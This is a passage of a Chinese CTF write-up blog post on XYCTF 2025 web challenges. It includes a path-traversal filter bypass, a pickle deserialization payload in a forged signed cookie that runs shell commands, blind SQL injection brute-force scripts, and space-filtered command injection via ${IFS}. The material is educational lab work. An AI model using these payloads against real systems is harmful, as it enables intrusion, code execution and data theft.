                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/blog/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/blog/links">友情链接</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2025xyctf wp</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/blog/images/avatar.svg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">collectcrop</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-04-08 11:26:17</span>
        <span class="mobile">2025-04-08 11:26:17</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-05-26 20:30:22</span>
            <span class="mobile">2025-05-26 20:30:22</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/blog/categories/wp/">wp</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/blog/tags/wp/">wp</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>18.1k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>94 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h2 id="一战队信息">一、战队信息</h2>
<p>战队名称：Initialization</p>
<p>战队排名：12</p>
<h2 id="二解题情况">二、解题情况</h2>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406222023429.png"
                      class=""
                >
<h2 id="三解题过程">三、解题过程</h2>
<h4 id="web-signin">web-Signin</h4>
<p>直接看代码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>提示了一个secret文件，/download路由能读取文件内容，但是有一定过滤，/secret路由看上去是生成cookie和检查cookie用的，/根目录
./当前目录
../上一级目录，这里我们穿插使用./.././../secret.txt能够绕过waf，读取到secret的内容<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406211100373.png"
                      class=""
                ></p>
<p><code>Hell0_H@cker_Y0u_A3r_Sm@r7</code>然后看/secret路由，我们通过模块bottle看看get_cookie和set_cookie的内容</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">self, name, value, secret=<span class="literal">None</span>, digestmod=hashlib.sha256, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._cookies:</span><br><span class="line">        <span class="variable language_">self</span>._cookies = SimpleCookie()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Monkey-patch Cookie lib to support &#x27;SameSite&#x27; parameter</span></span><br><span class="line">    <span class="comment"># https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1</span></span><br><span class="line">    <span class="keyword">if</span> py &lt; (<span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>):</span><br><span class="line">        Morsel._reserved.setdefault(<span class="string">&#x27;samesite&#x27;</span>, <span class="string">&#x27;SameSite&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">            depr(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&quot;Pickling of arbitrary objects into cookies is &quot;</span></span><br><span class="line">                        <span class="string">&quot;deprecated.&quot;</span>, <span class="string">&quot;Only store strings in cookies. &quot;</span></span><br><span class="line">                        <span class="string">&quot;JSON strings are fine, too.&quot;</span>)</span><br><span class="line">        encoded = base64.b64encode(pickle.dumps([name, value], -<span class="number">1</span>))</span><br><span class="line">        sig = base64.b64encode(hmac.new(tob(secret), encoded,</span><br><span class="line">                                        digestmod=digestmod).digest())</span><br><span class="line">        value = touni(tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + encoded)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key required for non-string cookies.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Cookie size plus options must not exceed 4kb.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) + <span class="built_in">len</span>(value) &gt; <span class="number">3800</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Content does not fit into a cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>._cookies[name] = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> options.items():</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;max_age&#x27;</span>, <span class="string">&#x27;maxage&#x27;</span>): <span class="comment"># &#x27;maxage&#x27; variant added in 0.13</span></span><br><span class="line">            key = <span class="string">&#x27;max-age&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, timedelta):</span><br><span class="line">                value = value.seconds + value.days * <span class="number">24</span> * <span class="number">3600</span></span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&#x27;expires&#x27;</span>:</span><br><span class="line">            value = http_date(value)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;same_site&#x27;</span>, <span class="string">&#x27;samesite&#x27;</span>): <span class="comment"># &#x27;samesite&#x27; variant added in 0.13</span></span><br><span class="line">            key, value = <span class="string">&#x27;samesite&#x27;</span>, (value <span class="keyword">or</span> <span class="string">&quot;none&quot;</span>).lower()</span><br><span class="line">            <span class="keyword">if</span> value <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;lax&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>, <span class="string">&#x27;none&#x27;</span>):</span><br><span class="line">                <span class="keyword">raise</span> CookieError(<span class="string">&quot;Invalid value for SameSite&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> (<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;httponly&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> value:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="variable language_">self</span>._cookies[name][key] = value</span><br></pre></td></tr></table></figure></div>
<p>能够看到set_cookie对name和value进行了pickle序列化，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure></div>
<p>而get_cookie对数据进行了pickle反序列化，我们打pickle反序列化的<code>__reduce__</code>重写漏洞https://blog.51cto.com/u_12205/8710727参考这篇文章</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406211838986.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;)&quot;</span>,))</span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    a = People()</span><br><span class="line">    session = &#123;<span class="string">&quot;name&quot;</span>: a&#125;</span><br><span class="line">    response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=<span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>)</span><br><span class="line">run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8088</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>在本地开一个用来生成cookie，将命令内容输出到app.py用/download界面查看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213100890.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213109708.png"
                      class=""
                >
<p>直接读就行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406213133619.png"
                      class=""
                >
<p>flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}</p>
<h4 id="web-ezsql手动滑稽">web-ezsql(手动滑稽)</h4>
<p>进入为一个登录界面，由题目知为sql，进行测试，在username处注入，测试得到过滤了空格，union，逗号，于是放弃常规注入，但是查询失败会回显账号或密码错误用的<code>&lt;strong&gt;</code>表情包裹，选择布尔盲注，使用%09绕过空格，<code>substr(database()%09from%091%09for%091)=“x”</code>用于判断，下面是爆破脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze9y7npewuaazcmbwx0.cloudeci1.ichunqiu.com//login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        temp=<span class="string">&quot;1&#x27;%09or%09ascii(substr(database()%09from%09&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;%09for%091))=&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;#&quot;</span></span><br><span class="line">        temp=unquote(temp)</span><br><span class="line">        payload=&#123;<span class="string">&quot;username&quot;</span>:temp,</span><br><span class="line">                 <span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">                 &#125;</span><br><span class="line">        response=requests.post(url,data=payload)<span class="comment">#爆库名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;strong&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze9y7npewuaazcmbwx0.cloudeci1.ichunqiu.com//login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        temp=<span class="string">&quot;1&#x27;%09or%09ascii(substr((select%09group_concat(secret)%09from%09double_check)%09from%09&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;%09for%091))=&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;#&quot;</span>    <span class="comment">#调整内部内容即可爆破表名、字段、内容</span></span><br><span class="line">        temp=unquote(temp)</span><br><span class="line">        payload=&#123;<span class="string">&quot;username&quot;</span>:temp,</span><br><span class="line">                 <span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">                 &#125;</span><br><span class="line">        response=requests.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;strong&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>最终得到的信息有：</p>
<p>库名testdb 表 double_check,user 字段secret,username,password
内容password：zhonghengyisheng username：yudeyoushang
secret：dtfrtkcc0czkoua9S</p>
<p>我们拿着这个信息登录<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210259268.png"
                      class=""
                ></p>
<p>进入到一个无回显的命令执行页面，测试发现过滤了空格，用${IFS}<span
class="math inline">\(9绕过，用&gt;将内容写入新页面`ls\)</span>{IFS}$9/&gt;1.txt`<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210421004.png"
                      class=""
                ></p>
<p>cat${IFS}$9/f*&gt;2.txt<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406210508212.png"
                      class=""
                ></p>
<p>XYCTF{ea54fff6-d3db-4055-95b4-6b13330d5b02}</p>
<h4 id="web-fate">web-fate</h4>
<p>直接看附件，定义了很多函数和路由，我这里的思路是先看看怎么走到db_search(),既然有过滤，说明需要过去，<code>if flask.request.remote_addr == '127.0.0.1':</code>需要我们以本地IP访问才能够进入/1337路由，这里又看向/proxy路由，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span 